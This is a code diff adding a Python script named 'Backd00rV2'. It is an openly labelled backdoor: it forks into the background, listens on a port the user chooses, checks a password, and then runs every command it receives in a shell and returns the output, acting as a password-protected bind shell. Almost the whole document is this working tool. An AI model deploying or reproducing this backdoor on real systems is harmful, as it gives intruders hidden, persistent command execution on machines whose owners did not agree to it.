@@ -1,0 +1,114 @@
+#!/usr/bin/python3
+
+import sys
+import os
+import socket
+import time
+
+import subprocess
+
+# ======= Variables =======
+SHELL = "/bin/bash -c"
+PORT = 1337 # Default port
+PW = ""
+HOST = ""
+
+# ======= Functions =======
+def usage():
+  """
+  usage
+  """
+  print("usage:\n" +
+        "./Backd00rV2 [PASSWORD] [PORT]\n")
+  exit(0)
+
+def error(c):
+  """
+  Errors
+  """
+  pw_in = ""
+  print("Error: " + c)
+  exit(-1)
+
+def shell(cmd):
+  """
+  Execute command and return result
+  """
+  # This shell may be better suited since it's more minimal
+  # sh = os.popen(SHELL + " " + cmd).readlines()
+
+  sh = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
+  return sh.stdout.read()
+
+def action(conn):
+  """
+  Authentication
+  """
+  msg = bytes("\nPassword?\n",'utf-8')
+  conn.send(msg)
+  try:
+    pw_in = conn.recv(len(PW))
+    pw_in = pw_in.decode('utf-8')
+  except:
+    print("Timeout")
+  else:
+    if (pw_in == PW): # Authenticated
+      msg = bytes("0pened d00r!\n","utf-8")
+      conn.send(msg)
+      
+      while True:
+        msg = bytes("$ ","utf-8")
+        conn.send(msg)
+        try:
+          cmd = conn.recv(1024) # receive command
+          cmd = cmd.decode("utf-8")
+        except:
+          print("Timeout")
+          return True
+        else:
+          if (cmd == ":dc"):
+            return True
+          else:
+            if (len(cmd) > 0):
+              output = shell(cmd)
+              conn.send(output)
+
+# ======= Main =======
+
+argv = sys.argv
+
+# Error handling
+if (len(argv) != 3):
+  usage()
+
+for n in argv[2]:
+  if (not n.isdigit()):
+    error("Not Valid Port")
+
+PORT = int(argv[2])
+if (PORT > 65535):
+  error("Not Valid Port")
+
+PW = argv[1]
+print("Password: " + str(PW) + "\n" + 
+      "Port: " + str(PORT) + "\n")
+
+# Create child process and kill parent
+if (os.fork() != 0):
+    sys.exit(0)
+
+# Create socket
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock.settimeout(5)
+
+sock.bind(("localhost",PORT))
+sock.listen(0)
+
+while True:
+  try:
+    (conn,address) = sock.accept()
+  except:
+    print("Error: Cannot accept")
+    time.sleep(1)
+  else:
+    run = action(conn)
